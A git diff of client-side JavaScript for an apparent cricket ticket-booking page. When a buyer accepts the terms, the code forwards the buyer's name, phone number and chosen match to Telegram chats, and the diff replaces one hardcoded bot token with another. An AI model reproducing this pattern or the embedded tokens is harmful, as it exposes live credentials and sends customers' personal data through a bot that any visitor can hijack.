@@ -120,15 +120,29 @@ if (popup) {
 }
 
 // ==========================================
-// 🔥 ACCEPT → GO TO SEATS (BULLETPROOF TELEGRAM FIX)
+// 🔥 ACCEPT → GO TO SEATS (WITH COOL LOADING ANIMATION)
 // ==========================================
 const acceptBtn = document.getElementById('accept-tnc-btn');
 if (acceptBtn) {
-    acceptBtn.onclick = () => {
+    acceptBtn.onclick = async () => {
         
         // 1. Button ko block karo taki user 2 baar click na kare
-        acceptBtn.innerText = "Please Wait...";
+        acceptBtn.innerText = "Processing...";
         acceptBtn.style.pointerEvents = "none";
+
+        // 🔥 2. FULL SCREEN LOADING OVERLAY DIKHAO 🔥
+        const loader = document.createElement('div');
+        loader.innerHTML = `
+            <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
+                <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #f84464; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
+                <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Getting Things Ready...</h3>
+                <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Moving to Seat Selection</p>
+                <style>
+                    @keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                </style>
+            </div>
+        `;
+        document.body.appendChild(loader);
         
         if (typeof fbq !== "undefined") {
             fbq('track', 'InitiateCheckout');
@@ -138,9 +152,9 @@ if (acceptBtn) {
         const phone = localStorage.getItem('customerPhone') || "Unknown";
         const matchTitle = match ? match.title : "Unknown Match";
 
-        const botToken = "8764436183:AAGzzpyaDS05CEYIZcITgUm7jA3qWDBfZpM"; 
-        const chatId1 = "6820660513"; 
-        const chatId2 = "8351268578"; 
+        // 🔥 Aapka Original Purana Bot Token aur sirf Aapki Chat ID 🔥
+        const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
+        const chatId = "6820660513"; 
         
         const telegramMsg = `🔥 *LEAD MOVED FORWARD! (Event Page)* 🔥\n\n` +
                             `👤 *Name:* ${name}\n` +
@@ -148,20 +162,20 @@ if (acceptBtn) {
                             `🏏 *Match:* ${matchTitle}\n` +
                             `👉 *Action:* Accepted T&C, moving to Seat Selection!`;
 
-        const url1 = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId1}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
-        const url2 = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId2}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
 
-        // 🔥 IMPORTANT FIX: Pehle message send hoga, fir page redirect hoga!
-        Promise.all([
-            fetch(url1).catch(e => console.log("TG Error 1")),
-            fetch(url2).catch(e => console.log("TG Error 2"))
-        ]).finally(() => {
+        // Puraney tareeke se single message send hoga aur agle page pe redirect hoga
+        try {
+            await fetch(url);
+        } catch (e) {
+            console.log("Telegram Error");
+        } finally {
             closePopup();
             // Data safe pass to seats
             localStorage.setItem('selectedMatch', JSON.stringify(match));
-            // Redirect
+            // Redirect to next page
             window.location.href = "seats.html";
-        });
+        }
     };
 }
 
